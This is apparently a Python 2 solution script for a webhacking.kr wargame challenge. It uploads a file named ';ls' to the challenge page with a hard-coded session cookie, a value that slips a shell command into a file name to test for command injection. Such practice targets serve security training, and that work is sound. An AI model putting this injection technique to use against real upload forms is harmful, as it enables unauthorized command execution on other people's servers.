#-*- coding: utf-8 -*-
import requests

challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-12/index.php"

uploadFile = {
    "upfile": (";ls", "bindon")
}
sessionCookie = {
    "PHPSESSID": "eabcdebaaabceddaabeabddefcabcdbe"
}

httpConnection = None
try:
    httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie)
    print httpRequest.text
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
